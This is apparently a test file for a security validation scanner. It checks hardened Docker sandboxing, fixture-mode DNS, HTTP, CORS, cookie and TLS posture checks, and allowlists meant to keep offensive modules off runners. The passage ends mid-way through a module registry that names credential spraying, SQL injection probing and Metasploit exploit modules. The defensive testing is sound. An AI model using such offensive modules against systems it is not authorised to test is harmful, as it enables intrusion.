import { randomUUID } from "node:crypto";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { afterEach, describe, expect, it, vi } from "vitest";

import type * as ToolchainModule from "./toolchain.js";

vi.mock("./toolchain.js", async (importOriginal) => {
  const actual = await importOriginal<typeof ToolchainModule>();

  return {
    ...actual,
    resolveOpenSourceToolRuntime: vi.fn(actual.resolveOpenSourceToolRuntime)
  };
});

import {
  buildHardenedDockerRunArgs,
  auditPipelineConfig,
  auditSupplyChainEvidence,
  assessOtIcsExposure,
  auditSaasPosture,
  deriveLicenseRisk,
  createAllowlistedDetectionMarkerId,
  evaluateDetectionMarker,
  evaluateModuleStartConstraints,
  executeModuleById,
  fixtureOrSimulationEvidenceAttributes,
  getModuleById,
  getModuleRunMode,
  isAllowlistedDetectionMarkerId,
  listModuleManifests,
  ModuleExecutionContextSchema,
  runDetectionMarkerEmitObserveLoop,
  validationStateForFixtureOrSimulation
} from "./index.js";
import {
  executeMockModuleById,
  getMockModuleById
} from "./mock-modules.fixture.js";
import {
  listOpenSourceCapabilities,
  listOpenSourceToolDefinitions,
  getOpenSourceToolDefinition,
  resolveOpenSourceToolRuntime
} from "./toolchain.js";
import {
  RUNNER_DISCOVER_MODULE_IDS,
  RUNNER_OSS_ENGINE_MODULE_IDS,
  RUNNER_MEASURED_MODULE_IDS
} from "@periscan/shared";

const resolveOpenSourceToolRuntimeMock = vi.mocked(
  resolveOpenSourceToolRuntime
);

afterEach(() => {
  resolveOpenSourceToolRuntimeMock.mockClear();
  vi.unstubAllGlobals();
});

describe("hardened Docker tool runtime", () => {
  it("builds a default-deny, non-root, read-only docker invocation", () => {
    const args = buildHardenedDockerRunArgs({
      commandArgs: ["detect", "--source", "/repo"],
      imageRef: "ghcr.io/example/tool:v1",
      volumes: [{ readonly: true, source: "/tmp/repo", target: "/repo" }]
    });

    expect(args).toEqual([
      "run",
      "--rm",
      "--read-only",
      "--cap-drop",
      "ALL",
      "--security-opt",
      "no-new-privileges:true",
      "--pids-limit",
      "256",
      "--cpus",
      "1",
      "--memory",
      "512m",
      "--network",
      "none",
      "--tmpfs",
      "/tmp:rw,noexec,nosuid,nodev,size=256m,uid=65532,gid=65532,mode=1777",
      "--user",
      "65532:65532",
      "--env",
      "HOME=/tmp",
      "--volume",
      "/tmp/repo:/repo:ro",
      "ghcr.io/example/tool:v1",
      "detect",
      "--source",
      "/repo"
    ]);
  });

  it("requires an explicit network mode for networked tools and preserves stdin/env flags before the image", () => {
    const args = buildHardenedDockerRunArgs({
      commandArgs: ["-u", "https://example.com"],
      envArgs: ["--env", "AWS_REGION"],
      imageRef: "projectdiscovery/nuclei:v3.8.0",
      interactive: true,
      network: "bridge",
      volumes: [{ source: "/tmp/out", target: "/out" }]
    });

    expect(args.slice(0, 3)).toEqual(["run", "-i", "--rm"]);
    expect(args).toContain("--network");
    expect(args[args.indexOf("--network") + 1]).toBe("bridge");
    expect(args).toContain("--read-only");
    expect(args).toContain("no-new-privileges:true");
    expect(args).toContain("65532:65532");
    expect(args.indexOf("projectdiscovery/nuclei:v3.8.0")).toBeGreaterThan(
      args.indexOf("AWS_REGION")
    );
    expect(args).toContain("/tmp/out:/out");
  });

  it("mounts staged Docker volumes read-only without depending on host path sharing", () => {
    const args = buildHardenedDockerRunArgs({
      commandArgs: ["verify", "/evidence/artifact"],
      imageRef: "ghcr.io/example/verifier:v1",
      namedVolumes: [
        {
          readonly: true,
          source: "periscan-evidence-test",
          target: "/evidence"
        }
      ]
    });

    expect(args).toContain("--mount");
    expect(args).toContain(
      "type=volume,source=periscan-evidence-test,target=/evidence,readonly"
    );
    expect(args).not.toContain("--volume");
  });
});

function createContext(overrides: Record<string, unknown> = {}) {
  return ModuleExecutionContextSchema.parse({
    integrationIds: [],
    inputs: {},
    missionId: randomUUID(),
    policyDecisionId: null,
    runId: randomUUID(),
    runnerId: null,
    safetyLevel: "PassiveReadOnly",
    scopeId: randomUUID(),
    target: {},
    tenantId: randomUUID(),
    ...overrides
  });
}

describe("periscan.dns_email_security_check", () => {
  function emailContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "PassiveReadOnly",
      target: { fixtureMode: true, hostname: "example.com", ...target }
    });
  }

  it("reports enforced SPF + DMARC as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.dns_email_security_check",
      emailContext({})
    );

    expect(output.outcome).toBe("email_security_enforced");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.dmarcEnforced).toBe(true);
  });

  it("flags missing SPF/DMARC as a measured exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.dns_email_security_check",
      emailContext({ fixtureSpfRecords: [], fixtureDmarcRecords: [] })
    );

    expect(output.outcome).toBe("email_security_misconfigured");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe(
      "DnsEmailSpoofingExposure"
    );
    expect(output.evidence[0]?.attributes.issues).toEqual([
      "missing_spf",
      "missing_dmarc"
    ]);
  });

  it("flags a permissive SPF (+all) as an exposure", async () => {
    const output = await executeModuleById(
      "periscan.dns_email_security_check",
      emailContext({
        fixtureSpfRecords: ["v=spf1 +all"],
        fixtureDmarcRecords: ["v=DMARC1; p=reject"]
      })
    );

    expect(output.outcome).toBe("email_security_misconfigured");
    expect(output.validationState).toBe("Validated");
    expect(output.evidence[0]?.attributes.issues).toEqual([
      "spf_permissive_all"
    ]);
  });

  it("flags a monitor-only DMARC (p=none) as unenforced", async () => {
    const output = await executeModuleById(
      "periscan.dns_email_security_check",
      emailContext({
        fixtureSpfRecords: ["v=spf1 -all"],
        fixtureDmarcRecords: ["v=DMARC1; p=none"]
      })
    );

    expect(output.outcome).toBe("email_security_misconfigured");
    expect(output.evidence[0]?.attributes.issues).toEqual([
      "dmarc_not_enforced"
    ]);
    expect(output.evidence[0]?.attributes.dmarcPolicy).toBe("none");
  });
});

describe("periscan.http_health_check", () => {
  function httpContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("reports a fully-headered response as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.http_health_check",
      httpContext({})
    );

    expect(output.outcome).toBe("http_healthy");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.measured).toBe(true);
  });

  it("flags missing security headers as a measured exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.http_health_check",
      httpContext({
        fixtureResponse: {
          headers: { "x-content-type-options": "nosniff" },
          status: 200
        }
      })
    );

    expect(output.outcome).toBe("http_missing_security_headers");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe(
      "HttpMissingSecurityHeaders"
    );
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
    expect(output.evidence[0]?.attributes.missingSecurityHeaders).toContain(
      "strict-transport-security"
    );
  });

  it("flags a transport downgrade to plaintext http as a measured exposure", async () => {
    const output = await executeModuleById(
      "periscan.http_health_check",
      httpContext({
        fixtureResponse: {
          finalUrl: "http://app.example.com/",
          headers: {
            "content-security-policy": "default-src 'self'",
            "strict-transport-security": "max-age=63072000",
            "x-content-type-options": "nosniff",
            "x-frame-options": "DENY"
          },
          status: 200
        }
      })
    );

    expect(output.outcome).toBe("http_insecure_transport");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe("HttpInsecureTransport");
    expect(output.evidence[0]?.attributes.insecureTransport).toBe(true);
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.http_health_check",
      httpContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("http_unreachable");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.errors.length).toBeGreaterThan(0);
  });
});

describe("periscan.http_cookie_security", () => {
  function cookieContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("treats fully-hardened cookies as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.http_cookie_security",
      cookieContext({
        fixtureSetCookie: [
          "session=abc; Path=/; Secure; HttpOnly; SameSite=Strict"
        ]
      })
    );

    expect(output.outcome).toBe("http_cookies_hardened");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
  });

  it("flags a cookie missing Secure/HttpOnly as a measured exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.http_cookie_security",
      cookieContext({ fixtureSetCookie: ["session=abc; Path=/; SameSite=Lax"] })
    );

    expect(output.outcome).toBe("http_insecure_cookies");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("HttpInsecureCookie");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
    expect(output.evidence[0]?.attributes.insecureCookies).toEqual([
      "session (missing Secure, HttpOnly)"
    ]);
  });

  it("returns Inconclusive when no cookies are set (nothing to measure)", async () => {
    const output = await executeModuleById(
      "periscan.http_cookie_security",
      cookieContext({ fixtureSetCookie: [] })
    );

    expect(output.outcome).toBe("http_no_cookies");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });
});

describe("periscan.http_redirect_enforcement", () => {
  function redirectContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("treats a 3xx upgrade to https:// as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.http_redirect_enforcement",
      redirectContext({
        fixtureResponse: {
          location: "https://app.example.com/",
          status: 301
        }
      })
    );

    expect(output.outcome).toBe("http_redirect_enforced");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.httpsRedirect).toBe(true);
  });

  it("flags cleartext served without an HTTPS redirect as a measured exposure", async () => {
    const output = await executeModuleById(
      "periscan.http_redirect_enforcement",
      redirectContext({ fixtureResponse: { status: 200 } })
    );

    expect(output.outcome).toBe("http_no_https_redirect");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("HttpNoHttpsRedirect");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
  });

  it("flags a redirect that stays on http:// (no upgrade) as an exposure", async () => {
    const output = await executeModuleById(
      "periscan.http_redirect_enforcement",
      redirectContext({
        fixtureResponse: {
          location: "http://www.app.example.com/",
          status: 302
        }
      })
    );

    expect(output.outcome).toBe("http_no_https_redirect");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.evidence[0]?.attributes.httpsRedirect).toBe(false);
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.http_redirect_enforcement",
      redirectContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("http_unreachable");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });
});

describe("periscan.http_cors_audit", () => {
  function corsContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("flags reflecting an arbitrary origin WITH credentials as a measured working exploit (Exploitable)", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({
        fixtureHeaders: {
          accessControlAllowCredentials: "true",
          accessControlAllowOrigin: "https://cors-probe.periscan.dev"
        }
      })
    );

    // Reflected arbitrary origin + credentials = evil.com can read authenticated
    // cross-origin responses. Actively confirmed → Exploitable, not just flagged.
    expect(output.outcome).toBe("http_cors_credentialed_exploit");
    expect(output.validationState).toBe("Exploitable");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe(
      "HttpCredentialedCorsExploit"
    );
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
    expect(output.evidence[0]?.attributes.reflectsArbitraryOrigin).toBe(true);
  });

  it("flags reflecting an arbitrary origin WITHOUT credentials as a measured exposure (Validated, not Exploitable)", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({
        fixtureHeaders: {
          accessControlAllowOrigin: "https://cors-probe.periscan.dev"
        }
      })
    );

    expect(output.outcome).toBe("http_cors_permissive");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe("HttpPermissiveCors");
  });

  it("does NOT flag a wildcard policy without credentials (intentional public API)", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({
        fixtureHeaders: { accessControlAllowOrigin: "*" }
      })
    );

    expect(output.outcome).toBe("http_cors_restricted");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
  });

  it("flags a wildcard WITH credentials as an exposure", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({
        fixtureHeaders: {
          accessControlAllowCredentials: "true",
          accessControlAllowOrigin: "*"
        }
      })
    );

    expect(output.outcome).toBe("http_cors_permissive");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe("HttpPermissiveCors");
  });

  it("treats no CORS headers as restricted (Fixed)", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({ fixtureHeaders: {} })
    );

    expect(output.outcome).toBe("http_cors_restricted");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.http_cors_audit",
      corsContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("http_unreachable");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });
});

describe("periscan.well_known_security_txt", () => {
  function securityTxtContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "PassiveReadOnly",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("observes a published disclosure channel as a ControlObservation (Detected, never Exposure)", async () => {
    const output = await executeModuleById(
      "periscan.well_known_security_txt",
      securityTxtContext({
        fixtureBody:
          "Contact: mailto:security@example.com\nExpires: 2027-01-01T00:00:00Z\n",
        fixtureStatus: 200
      })
    );

    expect(output.outcome).toBe("security_txt_present");
    expect(output.validationState).toBe("Detected");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalCategory).toBe("ControlObservation");
    expect(output.signals[0]?.signalSubcategory).toBe("SecurityTxtPublished");
    expect(output.evidence[0]?.attributes.hasContact).toBe(true);
    expect(output.evidence[0]?.attributes.hasExpires).toBe(true);
    // Never an exposure — a present channel is positive hygiene.
    expect(output.signals[0]?.signalCategory).not.toBe("Exposure");
  });

  it("treats a missing security.txt as an informational gap (Inconclusive, never Validated)", async () => {
    const output = await executeModuleById(
      "periscan.well_known_security_txt",
      securityTxtContext({ fixtureStatus: 404 })
    );

    expect(output.outcome).toBe("security_txt_absent");
    // Absence is informational — NOT a measured exposure.
    expect(output.validationState).toBe("Inconclusive");
    expect(output.validationState).not.toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalCategory).toBe("ControlObservation");
    expect(output.signals[0]?.signalSubcategory).toBe("SecurityTxtMissing");
    expect(output.signals[0]?.signalCategory).not.toBe("Exposure");
  });

  it("flags a present-but-incomplete channel (200 without a Contact field)", async () => {
    const output = await executeModuleById(
      "periscan.well_known_security_txt",
      securityTxtContext({
        fixtureBody: "# no contact field here\n",
        fixtureStatus: 200
      })
    );

    expect(output.outcome).toBe("security_txt_present");
    expect(output.validationState).toBe("Detected");
    expect(output.evidence[0]?.attributes.hasContact).toBe(false);
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.well_known_security_txt",
      securityTxtContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("http_unreachable");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });
});

describe("periscan.dns_resolution_check", () => {
  function dnsContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "PassiveReadOnly",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("reports a resolved hostname as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.dns_resolution_check",
      dnsContext({ fixtureRecords: { a: ["93.184.216.34"] } })
    );

    expect(output.outcome).toBe("dns_resolved");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.resolved).toBe(true);
  });

  it("flags a dangling CNAME as a measured exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.dns_resolution_check",
      dnsContext({
        fixtureRecords: {
          a: [],
          aaaa: [],
          cname: ["unclaimed.s3.amazonaws.com"]
        }
      })
    );

    expect(output.outcome).toBe("dns_dangling_cname");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("DnsDanglingCname");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
  });

  it("returns Inconclusive when the hostname does not resolve", async () => {
    const output = await executeModuleById(
      "periscan.dns_resolution_check",
      dnsContext({ fixtureUnresolvable: true })
    );

    expect(output.outcome).toBe("dns_unresolved");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.errors.length).toBeGreaterThan(0);
  });

  it("treats a CNAME that resolves to an address as healthy", async () => {
    const output = await executeModuleById(
      "periscan.dns_resolution_check",
      dnsContext({
        fixtureRecords: { a: ["203.0.113.10"], cname: ["cdn.example.net"] }
      })
    );

    expect(output.outcome).toBe("dns_resolved");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
  });
});

describe("periscan.dns_caa_check", () => {
  function caaContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "PassiveReadOnly",
      target: { fixtureMode: true, hostname: "app.example.com", ...target }
    });
  }

  it("treats a published CAA record as Fixed (issuance restricted)", async () => {
    const output = await executeModuleById(
      "periscan.dns_caa_check",
      caaContext({ fixtureCaaRecords: ["letsencrypt.org", "digicert.com"] })
    );

    expect(output.outcome).toBe("dns_caa_present");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.hasCaa).toBe(true);
    expect(output.evidence[0]?.attributes.caaIssuers).toEqual([
      "letsencrypt.org",
      "digicert.com"
    ]);
  });

  it("flags a missing CAA record as a measured issuance-control gap (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.dns_caa_check",
      caaContext({ fixtureCaaRecords: [] })
    );

    expect(output.outcome).toBe("dns_caa_missing");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("DnsCaaMissing");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
    expect(output.evidence[0]?.attributes.hasCaa).toBe(false);
  });
});

describe("periscan.tls_certificate_check", () => {
  const DAY_MS = 24 * 60 * 60 * 1000;

  function tlsContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "secure.example.com", ...target }
    });
  }

  it("reports a healthy certificate as Fixed with no exposure signal", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({})
    );

    expect(output.outcome).toBe("tls_certificate_healthy");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.measured).toBe(true);
  });

  it("flags an expired certificate as a measured exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({
        fixtureCertificate: {
          issuer: "CN=Real CA,O=CA",
          subject: "CN=secure.example.com,O=Acme",
          validFrom: new Date(Date.now() - 400 * DAY_MS).toISOString(),
          validTo: new Date(Date.now() - 10 * DAY_MS).toISOString()
        }
      })
    );

    expect(output.outcome).toBe("tls_certificate_expired");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("TlsCertificateExpired");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
  });

  it("warns on a soon-to-expire certificate", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({
        fixtureCertificate: {
          issuer: "CN=Real CA,O=CA",
          subject: "CN=secure.example.com,O=Acme",
          validFrom: new Date(Date.now() - 60 * DAY_MS).toISOString(),
          validTo: new Date(Date.now() + 10 * DAY_MS).toISOString()
        }
      })
    );

    expect(output.outcome).toBe("tls_certificate_expiring_soon");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "TlsCertificateExpiringSoon"
    );
  });

  it("flags a certificate that does not cover the hostname", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({
        fixtureCertificate: {
          issuer: "CN=Real CA,O=CA",
          subject: "CN=other.example.com,O=Acme",
          subjectAltName: "DNS:other.example.com, DNS:www.other.example.com",
          validFrom: new Date(Date.now() - 30 * DAY_MS).toISOString(),
          validTo: new Date(Date.now() + 200 * DAY_MS).toISOString()
        }
      })
    );

    expect(output.outcome).toBe("tls_certificate_hostname_mismatch");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "TlsCertificateHostnameMismatch"
    );
    expect(output.evidence[0]?.attributes.hostnameMismatch).toBe(true);
  });

  it("accepts a wildcard certificate that covers the hostname", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({
        hostname: "api.example.com",
        fixtureCertificate: {
          issuer: "CN=Real CA,O=CA",
          subject: "CN=*.example.com,O=Acme",
          subjectAltName: "DNS:*.example.com",
          validFrom: new Date(Date.now() - 30 * DAY_MS).toISOString(),
          validTo: new Date(Date.now() + 200 * DAY_MS).toISOString()
        }
      })
    );

    expect(output.outcome).toBe("tls_certificate_healthy");
    expect(output.evidence[0]?.attributes.hostnameMismatch).toBe(false);
  });

  it("flags a self-signed certificate", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({
        fixtureCertificate: {
          issuer: "CN=secure.example.com,O=Acme",
          subject: "CN=secure.example.com,O=Acme",
          validFrom: new Date(Date.now() - 30 * DAY_MS).toISOString(),
          validTo: new Date(Date.now() + 200 * DAY_MS).toISOString()
        }
      })
    );

    expect(output.outcome).toBe("tls_certificate_self_signed");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "TlsCertificateSelfSigned"
    );
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.tls_certificate_check",
      tlsContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("tls_certificate_unreachable");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.errors.length).toBeGreaterThan(0);
  });
});

describe("periscan.tls_protocol_audit", () => {
  function protocolContext(target: Record<string, unknown>) {
    return createContext({
      safetyLevel: "ActiveNonInvasive",
      target: { fixtureMode: true, hostname: "secure.example.com", ...target }
    });
  }

  it("flags a measured deprecated-protocol handshake as an exposure (Validated)", async () => {
    const output = await executeModuleById(
      "periscan.tls_protocol_audit",
      protocolContext({
        fixtureProtocols: { TLSv1: "supported", "TLSv1.1": "rejected" }
      })
    );

    expect(output.outcome).toBe("tls_deprecated_protocol");
    expect(output.validationState).toBe("Validated");
    expect(output.signals).toHaveLength(1);
    expect(output.signals[0]?.signalSubcategory).toBe("TlsDeprecatedProtocol");
    expect(output.signals[0]?.signalCategory).toBe("Exposure");
    expect(output.evidence[0]?.attributes.measured).toBe(true);
    expect(output.evidence[0]?.attributes.supportedDeprecatedProtocols).toEqual(
      ["TLSv1"]
    );
  });

  it("treats a server that rejects TLS 1.0 and 1.1 as Fixed (measured)", async () => {
    const output = await executeModuleById(
      "periscan.tls_protocol_audit",
      protocolContext({
        fixtureProtocols: { TLSv1: "rejected", "TLSv1.1": "rejected" }
      })
    );

    expect(output.outcome).toBe("tls_modern_only");
    expect(output.validationState).toBe("Fixed");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.measured).toBe(true);
  });

  it("returns Inconclusive when a protocol cannot be measured (never a pass/fail)", async () => {
    const output = await executeModuleById(
      "periscan.tls_protocol_audit",
      protocolContext({
        fixtureProtocols: { TLSv1: "unmeasurable", "TLSv1.1": "rejected" }
      })
    );

    expect(output.outcome).toBe("tls_protocol_inconclusive");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    // Honesty: cannot-measure must not be reported as measured.
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("returns Inconclusive when the endpoint is unreachable", async () => {
    const output = await executeModuleById(
      "periscan.tls_protocol_audit",
      protocolContext({ fixtureUnreachable: true })
    );

    expect(output.outcome).toBe("tls_protocol_inconclusive");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });
});

describe("runner-safe measured-module allowlist", () => {
  it("contains only real, control-plane, non-invasive, hostname-target measured modules", () => {
    expect(RUNNER_MEASURED_MODULE_IDS.length).toBeGreaterThan(0);
    for (const moduleId of RUNNER_MEASURED_MODULE_IDS) {
      const module = getModuleById(moduleId);
      // Must be a real registered module — the agent dispatches by id, so a
      // bogus id would issue a task nothing can execute.
      expect(module, `${moduleId} must be a registered module`).not.toBeNull();
      const manifest = module!.manifest;
      // Measured network checks run from the runner using the same built-ins;
      // the endpoint stimulus is intentionally AgentLocal.
      expect(["ControlPlane", "InternalRunner"]).toContain(
        manifest.executionMode
      );
      expect(manifest.liveSupported).toBe(true);
      expect(manifest.fixtureSupported).toBe(true);
      // Non-invasive only — never an offensive/adversarial safety level.
      expect(
        ["PassiveReadOnly", "ActiveNonInvasive"].includes(manifest.safetyLevel)
      ).toBe(true);
      // Hostname-targetable so the runner can point it at an internal host.
      expect(manifest.requiredInputs).toContain("hostname");
      // Proprietary built-ins (no third-party tool dependency to bundle).
      expect(manifest.toolName.startsWith("periscan-")).toBe(true);
    }
  });
});

describe("runner-safe discovery-module allowlist", () => {
  it("contains only real, in-network, non-invasive, fixture+live discovery modules", () => {
    expect(RUNNER_DISCOVER_MODULE_IDS.length).toBeGreaterThan(0);
    for (const moduleId of RUNNER_DISCOVER_MODULE_IDS) {
      const module = getModuleById(moduleId);
      expect(module, `${moduleId} must be a registered module`).not.toBeNull();
      const manifest = module!.manifest;
      // In-network discovery runs on the runner-agent (not the control plane).
      expect(manifest.executionMode).toBe("InternalRunner");
      // Runs live in-network AND in fixtureMode CI.
      expect(manifest.liveSupported).toBe(true);
      expect(manifest.fixtureSupported).toBe(true);
      // Discovery must be non-invasive — never offensive/adversarial.
      expect(
        ["PassiveReadOnly", "ActiveNonInvasive"].includes(manifest.safetyLevel)
      ).toBe(true);
    }
  });
});

describe("runner-safe OSS engine allowlist", () => {
  it("contains registered live scanners and never offensive modules", () => {
    expect(RUNNER_OSS_ENGINE_MODULE_IDS.length).toBeGreaterThan(0);
    for (const moduleId of RUNNER_OSS_ENGINE_MODULE_IDS) {
      const module = getModuleById(moduleId);
      expect(module, `${moduleId} must be a registered module`).not.toBeNull();
      const manifest = module!.manifest;
      expect(manifest.liveSupported).toBe(true);
      expect(
        ["PassiveReadOnly", "ActiveNonInvasive"].includes(manifest.safetyLevel)
      ).toBe(true);
    }
    expect(getModuleById("exploit.metasploit_check")?.manifest.liveSupported).not.toBe(
      undefined
    );
    expect(
      (RUNNER_OSS_ENGINE_MODULE_IDS as readonly string[]).includes(
        "exploit.metasploit_check"
      )
    ).toBe(false);
  });
});

describe("module registry", () => {
  it("lists only real validation modules (no mock/demo modules)", () => {
    expect(listModuleManifests().map((item) => item.moduleId)).toEqual([
      "periscan.dns_email_security_check",
      "periscan.http_health_check",
      "periscan.http_cookie_security",
      "periscan.http_redirect_enforcement",
      "periscan.http_cors_audit",
      "periscan.tcp_reachability",
      "periscan.detection_marker_probe",
      "periscan.endpoint_benign_marker_emit",
      "periscan.detection_marker_emit_observe",
      "periscan.endpoint_macos_detection_analytics",
      "periscan.endpoint_linux_detection_analytics",
      "periscan.kubernetes_cis_posture",
      "periscan.dns_exfil_canary",
      "sscs.pipeline_audit",
      "sspm.saas_posture",
      "ot_ics.protocol_exposure",
      "periscan.well_known_security_txt",
      "periscan.dns_resolution_check",
      "periscan.dns_caa_check",
      "periscan.tls_certificate_check",
      "periscan.tls_protocol_audit",
      "nuclei.external_exposure_safe",
      "prowler.aws_posture",
      "trivy.repo_dependency_scan",
      "trivy.container_scan",
      "syft.sbom_generate",
      "sigstore.cosign_verify_blob",
      "osv.repo_dependency_scan",
      "grype.repo_vulnerability_scan",
      "gitleaks.repo_secrets",
      "ai_app.safe_validation",
      "opencti.threat_context_import",
      "sigma.detection_rule_import",
      "ocsf.evidence_mapping",
      "runner.reachability_check",
      "atomic.control_validation_safe",
      "bloodhound.identity_pathing",
      "caldera.advanced_adversarial",
      "periscan.fix_verification.compare",
      "recon.host_discovery",
      "recon.service_inventory",
      "web.tls_audit",
      "web.sqli_probe",
      "recon.subdomain_enum",
      "recon.http_probe",
      "recon.dns_probe",
      "web.content_discovery",
      "web.zap_baseline",
      "web.nikto_scan",
      "web.fingerprint",
      "identity.cred_spray",
